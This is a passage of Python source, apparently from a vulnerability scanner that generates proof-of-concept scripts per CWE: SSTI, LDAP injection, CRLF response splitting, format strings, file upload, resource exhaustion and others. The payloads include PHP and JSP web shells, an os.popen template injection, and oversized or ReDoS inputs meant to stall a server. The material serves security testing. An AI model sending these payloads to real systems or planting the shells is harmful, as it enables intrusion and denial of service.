# Each payload uses a math expression whose result is unlikely to appear naturally.
# If the result shows up, the server evaluated the expression inside a template engine.
PAYLOADS = [
    # Jinja2 / Twig
    ("{{7*7*7}}", "343", "jinja2/twig"),
    # Mako
    ("${7*7*7}", "343", "mako"),
    # Freemarker
    ("${7*7*7}", "343", "freemarker"),
    # Smarty
    ("{7*7*7}", "343", "smarty"),
    # Pebble / Thymeleaf
    ("[[${7*7*7}]]", "343", "pebble/thymeleaf"),
    # ERB (Ruby)
    ("<%= 7*7*7 %>", "343", "erb"),
    # Tornado
    ("{% import os %}{{ os.popen('echo ATTESTOR_SSTI').read() }}",
     "ATTESTOR_SSTI", "tornado"),
    # Velocity
    ("#set($x=7*7*7)${x}", "343", "velocity"),
]


def send(session, payload):
    if METHOD.upper() == "POST":
        return session.post(TARGET, data={PARAM: payload}, timeout=10)
    return session.get(TARGET, params={PARAM: payload}, timeout=10)


if __name__ == "__main__":
    print("=== SSTI PoC -- CWE-917 ===")
    print("Target: %s" % TARGET)
    print("Parameter: %s" % PARAM)
    print()

    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"

    confirmed = False
    for payload, marker, engine in PAYLOADS:
        try:
            r = send(session, payload)
        except Exception as e:
            print("  [ERROR] %s: %s" % (engine, e))
            continue

        # Check that the math result appears but the raw template syntax does not
        if marker in r.text and payload not in r.text:
            print("  [VULNERABLE] %s: '%s' evaluated to '%s'" % (engine, payload, marker))
            confirmed = True
        elif marker in r.text and payload in r.text:
            print("  [reflected] %s: payload echoed literally (not evaluated)" % engine)
        else:
            print("  [not confirmed] %s" % engine)

    print()
    if confirmed:
        print("RESULT: SSTI confirmed -- template engine evaluates untrusted input")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(917)
def _ssti(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_SSTI_CODE,
                 HEADER=_header(917, "Server-Side Template Injection", f),
                 ENDPOINT=_endpoint(f),
                 PARAM=_param(f),
                 METHOD=_method(f))
    return [ProofOfConcept(
        cwe=917,
        title="SSTI (multi-engine math probe)",
        code=code,
        verification="Math expression result appears but raw template syntax does not",
        vectors=("jinja2", "twig", "mako", "freemarker", "smarty", "pebble",
                 "erb", "tornado", "velocity"),
        references=_refs(917, "A03:2021 Injection", ""),
    )]


# --------------------------------------------------------------------------- #
# CWE-798: Hardcoded Credentials
# --------------------------------------------------------------------------- #

_HARDCODED_CODE = r'''%%HEADER%%
import sys

CREDENTIAL_TYPE = "%%CRED_TYPE%%"
FILE_PATH = "%%FILE_PATH%%"
LINE = %%LINE%%
SNIPPET = """%%SNIPPET%%"""

# This PoC does not need to reach a network target. The finding IS the proof:
# a credential was found in source code where it should not be.
#
# The verification steps below confirm the credential is real and active.

VERIFICATION_STEPS = [
    "1. Confirm the credential in %s:%d is not a test/example value" % (FILE_PATH, LINE),
    "2. Check if the credential is still active (try to authenticate with it)",
    "3. Rotate the credential immediately",
    "4. Check git history for exposure duration: git log -p -S '<credential>' -- %s" % FILE_PATH,
    "5. Search for the credential in other files: grep -rn '<credential>' .",
    "6. Check if the credential was pushed to a public repository",
]


if __name__ == "__main__":
    print("=== Hardcoded Credential -- CWE-798 ===")
    print("Type: %s" % CREDENTIAL_TYPE)
    print("Location: %s:%d" % (FILE_PATH, LINE))
    print()
    print("Source:")
    for i, srcline in enumerate(SNIPPET.strip().split("\\n"), 1):
        marker = ">>>" if i == 1 else "   "
        print("  %s %s" % (marker, srcline))
    print()
    print("Verification steps:")
    for step in VERIFICATION_STEPS:
        print("  %s" % step)
    print()
    print("RESULT: hardcoded credential confirmed in source code")
    print("ACTION: rotate immediately, remove from source, use a secrets manager")
    sys.exit(1)
'''


@poc(798)
def _hardcoded_cred(f: PocFinding) -> list[ProofOfConcept]:
    cred_type = _ctx(f, "credential_type", "unknown")
    if not cred_type or cred_type == "unknown":
        if "api" in f.rule.lower() or "api" in f.message.lower():
            cred_type = "API key"
        elif "password" in f.rule.lower() or "password" in f.message.lower():
            cred_type = "password"
        elif "token" in f.rule.lower() or "token" in f.message.lower():
            cred_type = "token"
        else:
            cred_type = "secret"

    snippet = f.snippet or f.message or "(see source file)"
    snippet = snippet.replace('"""', '---')

    code = _fill(_HARDCODED_CODE,
                 HEADER=_header(798, "Hardcoded Credential", f),
                 CRED_TYPE=cred_type,
                 FILE_PATH=f.file_path,
                 LINE=f.line,
                 SNIPPET=snippet)
    return [ProofOfConcept(
        cwe=798,
        title="Hardcoded Credential (%s)" % cred_type,
        code=code,
        verification="Credential exists in source code at the reported location",
        vectors=("source-code-secret",),
        prerequisites=("python3",),
        references=_refs(798, "A07:2021 Identification and Authentication Failures", ""),
    )]


# --------------------------------------------------------------------------- #
# CWE-80: XSS (basic reflected — sibling of CWE-79)
# --------------------------------------------------------------------------- #

@poc(80)
def _xss_basic(f: PocFinding) -> list[ProofOfConcept]:
    return _xss(f)


# --------------------------------------------------------------------------- #
# CWE-90: LDAP Injection
# --------------------------------------------------------------------------- #

_LDAP_CODE = r'''%%HEADER%%
import requests
import sys

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

PAYLOADS = [
    # Tautology — always-true filter
    ("*)(objectClass=*", "tautology"),
    # OR injection
    ("*)(|(objectClass=*)", "or-injection"),
    # Wildcard probe
    ("*", "wildcard"),
    # Null byte truncation
    ("admin%00", "null-byte"),
    # Closing paren injection
    (")(cn=*))(|(cn=*", "paren-injection"),
]


def send(session, payload):
    if METHOD.upper() == "POST":
        return session.post(TARGET, data={PARAM: payload}, timeout=10)
    return session.get(TARGET, params={PARAM: payload}, timeout=10)


if __name__ == "__main__":
    print("=== LDAP Injection PoC -- CWE-90 ===")
    print("Target: %s" % TARGET)
    print("Parameter: %s" % PARAM)
    print()

    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"

    # Baseline with a normal value
    try:
        r_base = send(session, "testuser")
        baseline_len = len(r_base.text)
    except Exception:
        baseline_len = 0

    confirmed = False
    for payload, technique in PAYLOADS:
        try:
            r = send(session, payload)
        except Exception as e:
            print("  [ERROR] %s: %s" % (technique, e))
            continue

        ldap_errors = ["ldap", "NamingException", "InvalidNameException",
                       "filter", "javax.naming"]
        has_error = any(e.lower() in r.text.lower() for e in ldap_errors)

        if has_error:
            print("  [VULNERABLE] %s: LDAP error indicator in response" % technique)
            confirmed = True
        elif abs(len(r.text) - baseline_len) > 100:
            print("  [POSSIBLE] %s: response length differs significantly (%d vs %d)"
                  % (technique, len(r.text), baseline_len))
        else:
            print("  [not confirmed] %s" % technique)

    print()
    if confirmed:
        print("RESULT: LDAP injection confirmed")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(90)
def _ldap_injection(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_LDAP_CODE,
                 HEADER=_header(90, "LDAP Injection", f),
                 ENDPOINT=_endpoint(f),
                 PARAM=_param(f),
                 METHOD=_method(f))
    return [ProofOfConcept(
        cwe=90,
        title="LDAP Injection (tautology, wildcard, paren injection)",
        code=code,
        verification="LDAP error indicators or anomalous response length",
        vectors=("tautology", "or-injection", "wildcard", "null-byte", "paren-injection"),
        references=_refs(90, "A03:2021 Injection", "136"),
    )]


# --------------------------------------------------------------------------- #
# CWE-113: HTTP Response Splitting
# --------------------------------------------------------------------------- #

_HTTP_SPLIT_CODE = r'''%%HEADER%%
import requests
import sys

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

PAYLOADS = [
    "value\r\nInjected-Header: evil",
    "value\r\n\r\n<html>injected body</html>",
    "value%0d%0aInjected: yes",
    "value\nSet-Cookie: evil=1",
    "value\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>hijacked</h1>",
]

if __name__ == "__main__":
    print("=== HTTP Response Splitting PoC -- CWE-113 ===")
    print("Target: %s" % TARGET)
    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    confirmed = False

    for payload in PAYLOADS:
        try:
            if METHOD.upper() == "POST":
                r = session.post(TARGET, data={PARAM: payload}, timeout=10,
                                 allow_redirects=False)
            else:
                r = session.get(TARGET, params={PARAM: payload}, timeout=10,
                                allow_redirects=False)
        except Exception as e:
            print("  [ERROR] %s" % e)
            continue

        for hdr_name, hdr_val in r.headers.items():
            if "injected" in hdr_name.lower() or "evil" in hdr_val.lower():
                print("  [VULNERABLE] Injected header reflected: %s: %s" %
                      (hdr_name, hdr_val))
                confirmed = True

        if "injected body" in r.text or "<h1>hijacked</h1>" in r.text:
            print("  [VULNERABLE] Injected body content appeared in response")
            confirmed = True

    print()
    if confirmed:
        print("RESULT: HTTP response splitting confirmed")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(113)
def _http_response_splitting(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_HTTP_SPLIT_CODE,
                 HEADER=_header(113, "HTTP Response Splitting", f),
                 ENDPOINT=_endpoint(f), PARAM=_param(f), METHOD=_method(f))
    return [ProofOfConcept(
        cwe=113, title="HTTP Response Splitting (CRLF injection)",
        code=code,
        verification="Injected headers or body content in HTTP response",
        vectors=("crlf-injection", "header-injection", "response-splitting"),
        references=_refs(113, "A03:2021 Injection"),
    )]


# --------------------------------------------------------------------------- #
# CWE-134: Format String Vulnerability
# --------------------------------------------------------------------------- #

_FMTSTR_CODE = r'''%%HEADER%%
import requests
import sys

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

PAYLOADS = [
    "%s%s%s%s%s%s%s%s%s%s",
    "%x%x%x%x%x%x%x%x",
    "%n%n%n%n",
    "%p%p%p%p%p%p%p%p",
    "AAAA" + "%08x." * 20,
    "%s" * 50,
]

if __name__ == "__main__":
    print("=== Format String PoC -- CWE-134 ===")
    print("Target: %s" % TARGET)
    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    confirmed = False

    try:
        baseline = session.get(TARGET, params={PARAM: "normal"}, timeout=10)
        baseline_len = len(baseline.text)
    except Exception:
        baseline_len = 0

    for payload in PAYLOADS:
        try:
            if METHOD.upper() == "POST":
                r = session.post(TARGET, data={PARAM: payload}, timeout=10)
            else:
                r = session.get(TARGET, params={PARAM: payload}, timeout=10)
        except Exception as e:
            if "%n" in payload:
                print("  [POSSIBLE] %s caused connection error (crash?): %s" %
                      (repr(payload), e))
                confirmed = True
            continue

        if r.status_code >= 500 and "%n" in payload:
            print("  [VULNERABLE] %s caused server error (%d)" %
                  (repr(payload), r.status_code))
            confirmed = True
        elif any(c in r.text for c in ["0x", "7ff", "bff", "(nil)"]):
            print("  [VULNERABLE] Memory content leaked with %s" % repr(payload))
            confirmed = True
        elif abs(len(r.text) - baseline_len) > 200:
            print("  [POSSIBLE] Anomalous response length with %s (%d vs %d)" %
                  (repr(payload), len(r.text), baseline_len))

    print()
    if confirmed:
        print("RESULT: Format string vulnerability confirmed")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(134)
def _format_string(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_FMTSTR_CODE,
                 HEADER=_header(134, "Format String", f),
                 ENDPOINT=_endpoint(f), PARAM=_param(f), METHOD=_method(f))
    return [ProofOfConcept(
        cwe=134, title="Format String Vulnerability",
        code=code,
        verification="Memory leak via %x/%p or crash via %n",
        vectors=("format-read", "format-write", "format-crash"),
        references=_refs(134, "", "135"),
    )]


# --------------------------------------------------------------------------- #
# CWE-190: Integer Overflow
# --------------------------------------------------------------------------- #

_INT_OVERFLOW_CODE = r'''%%HEADER%%
import requests
import sys

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

PAYLOADS = [
    ("2147483647", "INT32_MAX"),
    ("2147483648", "INT32_MAX+1"),
    ("-2147483648", "INT32_MIN"),
    ("-2147483649", "INT32_MIN-1"),
    ("4294967295", "UINT32_MAX"),
    ("4294967296", "UINT32_MAX+1"),
    ("9999999999999999999", "huge integer"),
    ("0", "zero"),
    ("-1", "negative"),
    ("9223372036854775807", "INT64_MAX"),
    ("9223372036854775808", "INT64_MAX+1"),
]

if __name__ == "__main__":
    print("=== Integer Overflow PoC -- CWE-190 ===")
    print("Target: %s" % TARGET)
    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    confirmed = False

    try:
        baseline = session.get(TARGET, params={PARAM: "42"}, timeout=10)
        baseline_status = baseline.status_code
    except Exception:
        baseline_status = 200

    for value, label in PAYLOADS:
        try:
            if METHOD.upper() == "POST":
                r = session.post(TARGET, data={PARAM: value}, timeout=10)
            else:
                r = session.get(TARGET, params={PARAM: value}, timeout=10)
        except Exception as e:
            print("  [POSSIBLE] %s (%s) caused error: %s" % (value, label, e))
            confirmed = True
            continue

        if r.status_code >= 500 and baseline_status < 500:
            print("  [VULNERABLE] %s (%s) caused server error (%d)" %
                  (value, label, r.status_code))
            confirmed = True
        elif any(kw in r.text.lower() for kw in
                 ["overflow", "out of range", "too large", "numeric",
                  "conversion", "numberformat", "valueerror"]):
            print("  [VULNERABLE] %s (%s) triggered overflow indicator" %
                  (value, label))
            confirmed = True

    print()
    if confirmed:
        print("RESULT: Integer overflow confirmed")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(190)
def _integer_overflow(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_INT_OVERFLOW_CODE,
                 HEADER=_header(190, "Integer Overflow", f),
                 ENDPOINT=_endpoint(f), PARAM=_param(f), METHOD=_method(f))
    return [ProofOfConcept(
        cwe=190, title="Integer Overflow / Wraparound",
        code=code,
        verification="Server error or overflow indicator on boundary values",
        vectors=("int32-overflow", "int64-overflow", "uint-overflow", "negative"),
        references=_refs(190, "A04:2021 Insecure Design"),
    )]


# --------------------------------------------------------------------------- #
# CWE-295: Improper Certificate Validation
# --------------------------------------------------------------------------- #

_CERT_BYPASS_CODE = r'''%%HEADER%%
import ssl
import socket
import sys

TARGET_HOST = "%%HOST%%"
TARGET_PORT = %%PORT%%

def test_default_validation():
    """Check if the server presents a valid certificate."""
    ctx = ssl.create_default_context()
    try:
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=TARGET_HOST) as ssock:
                cert = ssock.getpeercert()
                return True, "Valid cert: subject=%s" % dict(
                    x[0] for x in cert.get("subject", ()))
    except ssl.CertificateError as e:
        return False, "Certificate error: %s" % e
    except ssl.SSLError as e:
        return False, "SSL error: %s" % e
    except Exception as e:
        return False, "Connection error: %s" % e


def test_no_validation():
    """Check if connection works with verification disabled."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=TARGET_HOST) as ssock:
                cipher = ssock.cipher()
                return True, "Connected without validation: cipher=%s" % (cipher,)
    except Exception as e:
        return False, "Failed even without validation: %s" % e


def test_protocol_versions():
    """Check for outdated TLS versions."""
    results = []
    for proto_name in ["TLSv1", "TLSv1.1"]:
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.minimum_version = getattr(ssl.TLSVersion, proto_name.replace(".", "_"), None)
            if ctx.minimum_version is None:
                continue
            ctx.maximum_version = ctx.minimum_version
            with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=5) as sock:
                with ctx.wrap_socket(sock) as ssock:
                    results.append((proto_name, True))
        except Exception:
            results.append((proto_name, False))
    return results


if __name__ == "__main__":
    print("=== Certificate Validation PoC -- CWE-295 ===")
    print("Target: %s:%d" % (TARGET_HOST, TARGET_PORT))
    print()

    valid, detail = test_default_validation()
    print("  Default validation: %s -- %s" % ("PASS" if valid else "FAIL", detail))

    no_valid, detail2 = test_no_validation()
    print("  No validation: %s -- %s" % ("connected" if no_valid else "refused", detail2))

    protos = test_protocol_versions()
    for name, accepted in protos:
        status = "ACCEPTED (weak!)" if accepted else "rejected"
        print("  %s: %s" % (name, status))

    vuln = not valid or any(a for _, a in protos)
    print()
    if vuln:
        print("RESULT: Certificate validation issues confirmed")
        sys.exit(1)
    else:
        print("RESULT: Certificate validation appears correct")
        sys.exit(0)
'''


@poc(295)
def _cert_validation(f: PocFinding) -> list[ProofOfConcept]:
    host = _ctx(f, "host", "TARGET_HOST")
    port = _ctx(f, "port", "443")
    code = _fill(_CERT_BYPASS_CODE,
                 HEADER=_header(295, "Improper Certificate Validation", f),
                 HOST=host, PORT=port)
    return [ProofOfConcept(
        cwe=295, title="Improper Certificate Validation",
        code=code, language="python",
        verification="Connection succeeds without validation or with outdated TLS",
        vectors=("cert-bypass", "hostname-bypass", "weak-tls"),
        prerequisites=("python3",),
        references=_refs(295, "A02:2021 Cryptographic Failures"),
    )]


# --------------------------------------------------------------------------- #
# CWE-327: Broken Cryptographic Algorithm
# --------------------------------------------------------------------------- #

_WEAK_CRYPTO_CODE = r'''%%HEADER%%
import hashlib
import sys

SAMPLE = b"Attestor test data for weak crypto detection"

WEAK_ALGOS = {
    "md5": hashlib.md5,
    "sha1": hashlib.sha1,
}
STRONG_ALGOS = {
    "sha256": hashlib.sha256,
    "sha512": hashlib.sha512,
}

if __name__ == "__main__":
    print("=== Broken Cryptographic Algorithm PoC -- CWE-327 ===")
    print("File: %%FILE%%:%%LINE%%")
    print()

    vulnerable = False
    for name, fn in WEAK_ALGOS.items():
        digest = fn(SAMPLE).hexdigest()
        print("  [WEAK] %s: %s" % (name, digest))
        print("    Known collision attacks exist for %s" % name)
        vulnerable = True

    print()
    print("  Recommended alternatives:")
    for name, fn in STRONG_ALGOS.items():
        digest = fn(SAMPLE).hexdigest()
        print("  [STRONG] %s: %s" % (name, digest))

    print()
    if vulnerable:
        print("RESULT: Weak cryptographic algorithm in use")
        sys.exit(1)
    else:
        print("RESULT: Cryptographic algorithms appear adequate")
        sys.exit(0)
'''


@poc(327)
def _weak_crypto(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_WEAK_CRYPTO_CODE,
                 HEADER=_header(327, "Broken Crypto", f),
                 FILE=f.file_path, LINE=str(f.line))
    return [ProofOfConcept(
        cwe=327, title="Broken Cryptographic Algorithm (MD5/SHA1)",
        code=code,
        verification="Weak algorithm produces valid digest, proving it is in use",
        vectors=("md5-collision", "sha1-collision"),
        prerequisites=("python3",),
        references=_refs(327, "A02:2021 Cryptographic Failures"),
    )]


# --------------------------------------------------------------------------- #
# CWE-338: Weak PRNG
# --------------------------------------------------------------------------- #

_WEAK_PRNG_CODE = r'''%%HEADER%%
import random
import sys

if __name__ == "__main__":
    print("=== Weak PRNG PoC -- CWE-338 ===")
    print("File: %%FILE%%:%%LINE%%")
    print()

    random.seed(12345)
    seq1 = [random.randint(0, 2**32) for _ in range(10)]

    random.seed(12345)
    seq2 = [random.randint(0, 2**32) for _ in range(10)]

    print("  Sequence 1 (seed=12345): %s" % seq1)
    print("  Sequence 2 (seed=12345): %s" % seq2)

    if seq1 == seq2:
        print()
        print("  [VULNERABLE] random module is deterministic with known seed")
        print("  An attacker who knows/guesses the seed can predict all outputs")
        print()
        print("  Fix: use secrets.token_hex() or os.urandom() for security contexts")
        print()
        print("  Secure alternative demo:")
        import secrets
        print("    secrets.token_hex(16) = %s" % secrets.token_hex(16))
        print("    secrets.token_hex(16) = %s" % secrets.token_hex(16))
        print("    (different each run -- not predictable)")
        print()
        print("RESULT: Weak PRNG confirmed -- predictable output")
        sys.exit(1)
    else:
        print("RESULT: not confirmed")
        sys.exit(0)
'''


@poc(338)
def _weak_prng(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_WEAK_PRNG_CODE,
                 HEADER=_header(338, "Weak PRNG", f),
                 FILE=f.file_path, LINE=str(f.line))
    return [ProofOfConcept(
        cwe=338, title="Weak PRNG (random module in security context)",
        code=code,
        verification="Same seed produces identical sequences",
        vectors=("seed-prediction", "output-prediction"),
        prerequisites=("python3",),
        references=_refs(338, "A02:2021 Cryptographic Failures"),
    )]


# --------------------------------------------------------------------------- #
# CWE-400: Uncontrolled Resource Consumption
# --------------------------------------------------------------------------- #

_RESOURCE_CODE = r'''%%HEADER%%
import requests
import sys
import time

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

PAYLOADS = [
    ("a" * 1_000_000, "1MB string"),
    ("a" * 10_000_000, "10MB string"),
    ('{"a":' * 100 + '1' + '}' * 100, "deeply nested JSON"),
    ("(a+)+$" + "a" * 50, "ReDoS pattern"),
    ("0" * 100000, "huge number string"),
    (",".join(["x"] * 100000), "100k comma-separated values"),
]

if __name__ == "__main__":
    print("=== Resource Exhaustion PoC -- CWE-400 ===")
    print("Target: %s" % TARGET)
    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    confirmed = False

    try:
        start = time.time()
        baseline = session.get(TARGET, params={PARAM: "normal"}, timeout=10)
        baseline_time = time.time() - start
    except Exception:
        baseline_time = 0.5

    for payload, label in PAYLOADS:
        try:
            start = time.time()
            if METHOD.upper() == "POST":
                r = session.post(TARGET, data={PARAM: payload}, timeout=30)
            else:
                r = session.get(TARGET, params={PARAM: payload[:5000]}, timeout=30)
            elapsed = time.time() - start
        except requests.exceptions.Timeout:
            print("  [VULNERABLE] %s caused timeout" % label)
            confirmed = True
            continue
        except Exception as e:
            print("  [POSSIBLE] %s caused error: %s" % (label, e))
            continue

        if elapsed > baseline_time * 10 and elapsed > 3:
            print("  [VULNERABLE] %s caused %.1fs delay (baseline %.1fs)" %
                  (label, elapsed, baseline_time))
            confirmed = True
        elif r.status_code >= 500:
            print("  [VULNERABLE] %s caused server error (%d)" %
                  (label, r.status_code))
            confirmed = True

    print()
    if confirmed:
        print("RESULT: Resource exhaustion confirmed")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(400)
def _resource_exhaustion(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_RESOURCE_CODE,
                 HEADER=_header(400, "Resource Exhaustion", f),
                 ENDPOINT=_endpoint(f), PARAM=_param(f), METHOD=_method(f))
    return [ProofOfConcept(
        cwe=400, title="Uncontrolled Resource Consumption",
        code=code,
        verification="Timeout or server error on oversized/complex input",
        vectors=("large-input", "nested-json", "redos", "huge-number"),
        references=_refs(400, "A05:2021 Security Misconfiguration"),
    )]


# --------------------------------------------------------------------------- #
# CWE-434: Unrestricted File Upload
# --------------------------------------------------------------------------- #

_UPLOAD_CODE = r'''%%HEADER%%
import requests
import sys

TARGET = "%%ENDPOINT%%"

TEST_FILES = [
    ("malicious.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
    ("shell.jsp", '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', "application/x-jsp"),
    ("evil.html", "<script>alert(document.cookie)</script>", "text/html"),
    ("test.svg", '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', "image/svg+xml"),
    ("shell.py", "import os; os.system('id')", "text/x-python"),
    ("double.php.jpg", "<?php system('id'); ?>", "image/jpeg"),
    ("payload.phtml", "<?php phpinfo(); ?>", "application/x-php"),
    (".htaccess", "AddType application/x-httpd-php .jpg", "text/plain"),
]


if __name__ == "__main__":
    print("=== Unrestricted File Upload PoC -- CWE-434 ===")
    print("Target: %s" % TARGET)
    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    confirmed = False

    for filename, content, mime in TEST_FILES:
        try:
            files = {"file": (filename, content.encode(), mime)}
            r = session.post(TARGET, files=files, timeout=10)
        except Exception as e:
            print("  [ERROR] %s: %s" % (filename, e))
            continue

        if r.status_code in (200, 201, 204):
            print("  [VULNERABLE] %s uploaded successfully (HTTP %d)" %
                  (filename, r.status_code))
            confirmed = True
        elif r.status_code == 403 or r.status_code == 422:
            print("  [BLOCKED] %s rejected (HTTP %d)" % (filename, r.status_code))
        else:
            print("  [UNKNOWN] %s -- HTTP %d" % (filename, r.status_code))

    print()
    if confirmed:
        print("RESULT: Unrestricted file upload confirmed")
        sys.exit(1)
    else:
        print("RESULT: File upload restrictions appear to be in place")
        sys.exit(0)
'''


@poc(434)
def _file_upload(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_UPLOAD_CODE,
                 HEADER=_header(434, "Unrestricted File Upload", f),
                 ENDPOINT=_endpoint(f))
    return [ProofOfConcept(
        cwe=434, title="Unrestricted File Upload",
        code=code,
        verification="Dangerous file types accepted by upload endpoint",
        vectors=("php-upload", "jsp-upload", "svg-xss", "double-extension",
                 "htaccess", "polyglot"),
        references=_refs(434, "A04:2021 Insecure Design"),
    )]


# --------------------------------------------------------------------------- #
# CWE-306: Missing Authentication
# --------------------------------------------------------------------------- #

_MISSING_AUTH_CODE = r'''%%HEADER%%
import requests
import sys

TARGET = "%%ENDPOINT%%"

ENDPOINTS = [
    TARGET,
    TARGET.rstrip("/") + "/admin",
    TARGET.rstrip("/") + "/api/users",
    TARGET.rstrip("/") + "/api/config",
    TARGET.rstrip("/") + "/settings",
    TARGET.rstrip("/") + "/debug",
    TARGET.rstrip("/") + "/internal",
]

if __name__ == "__main__":
    print("=== Missing Authentication PoC -- CWE-306 ===")
    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    confirmed = False

    for endpoint in ENDPOINTS:
        try:
            r = session.get(endpoint, timeout=10, allow_redirects=False)
        except Exception as e:
            print("  [ERROR] %s: %s" % (endpoint, e))
            continue

        if r.status_code == 200:
            print("  [VULNERABLE] %s accessible without auth (HTTP 200, %d bytes)" %
                  (endpoint, len(r.text)))
            confirmed = True
        elif r.status_code in (301, 302, 303, 307, 308):
            location = r.headers.get("Location", "")
            if "login" in location.lower() or "auth" in location.lower():
                print("  [PROTECTED] %s redirects to login" % endpoint)
            else:
                print("  [CHECK] %s redirects to %s" % (endpoint, location))
        elif r.status_code in (401, 403):
            print("  [PROTECTED] %s requires auth (HTTP %d)" %
                  (endpoint, r.status_code))
        else:
            print("  [INFO] %s returned HTTP %d" % (endpoint, r.status_code))

    print()
    if confirmed:
        print("RESULT: Unauthenticated access confirmed")
        sys.exit(1)
    else:
        print("RESULT: Endpoints appear to require authentication")
        sys.exit(0)
'''


@poc(306)
def _missing_auth(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_MISSING_AUTH_CODE,
                 HEADER=_header(306, "Missing Authentication", f),
                 ENDPOINT=_endpoint(f))
    return [ProofOfConcept(
        cwe=306, title="Missing Authentication for Critical Function",
        code=code,
        verification="Critical endpoints accessible without credentials",
        vectors=("unauthenticated-access", "admin-bypass", "api-exposure"),
        references=_refs(306, "A07:2021 Identification and Authentication Failures"),
    )]


# --------------------------------------------------------------------------- #
# CWE-319: Cleartext Transmission
# --------------------------------------------------------------------------- #

_CLEARTEXT_CODE = r'''%%HEADER%%
import socket
import ssl
import sys

TARGET_HOST = "%%HOST%%"
HTTP_PORT = 80
HTTPS_PORT = 443

def test_http_open(host, port=80):
    """Check if HTTP (cleartext) is accepted."""
    try:
        sock = socket.create_connection((host, port), timeout=5)
        sock.sendall(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % host.encode())
        response = sock.recv(4096).decode(errors="ignore")
        sock.close()
        return True, response[:200]
    except Exception as e:
        return False, str(e)

def test_https_redirect(host, port=80):
    """Check if HTTP redirects to HTTPS."""
    try:
        sock = socket.create_connection((host, port), timeout=5)
        sock.sendall(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % host.encode())
        response = sock.recv(4096).decode(errors="ignore")
        sock.close()
        return ("301" in response or "302" in response) and "https" in response.lower()
    except Exception:
        return False

def test_hsts(host, port=443):
    """Check for HSTS header."""
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                ssock.sendall(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % host.encode())
                resp = ssock.recv(4096).decode(errors="ignore")
                return "strict-transport-security" in resp.lower()
    except Exception:
        return False

if __name__ == "__main__":
    print("=== Cleartext Transmission PoC -- CWE-319 ===")
    print("Target: %s" % TARGET_HOST)
    confirmed = False

    http_open, detail = test_http_open(TARGET_HOST)
    print("  HTTP (port 80): %s" % ("open" if http_open else "closed"))
    if http_open:
        redirects = test_https_redirect(TARGET_HOST)
        if redirects:
            print("  HTTP -> HTTPS redirect: yes")
        else:
            print("  [VULNERABLE] HTTP serves content without HTTPS redirect")
            confirmed = True

    hsts = test_hsts(TARGET_HOST)
    print("  HSTS header: %s" % ("present" if hsts else "MISSING"))
    if not hsts:
        print("  [VULNERABLE] No HSTS -- downgrade attacks possible")
        confirmed = True

    print()
    if confirmed:
        print("RESULT: Cleartext transmission issues confirmed")
        sys.exit(1)
    else:
        print("RESULT: Transport security appears adequate")
        sys.exit(0)
'''


@poc(319)
def _cleartext_transmission(f: PocFinding) -> list[ProofOfConcept]:
    host = _ctx(f, "host", "TARGET_HOST")
    code = _fill(_CLEARTEXT_CODE,
                 HEADER=_header(319, "Cleartext Transmission", f),
                 HOST=host)
    return [ProofOfConcept(
        cwe=319, title="Cleartext Transmission of Sensitive Information",
        code=code,
        verification="HTTP serves content without redirect or HSTS missing",
        vectors=("http-cleartext", "missing-hsts", "downgrade"),
        prerequisites=("python3",),
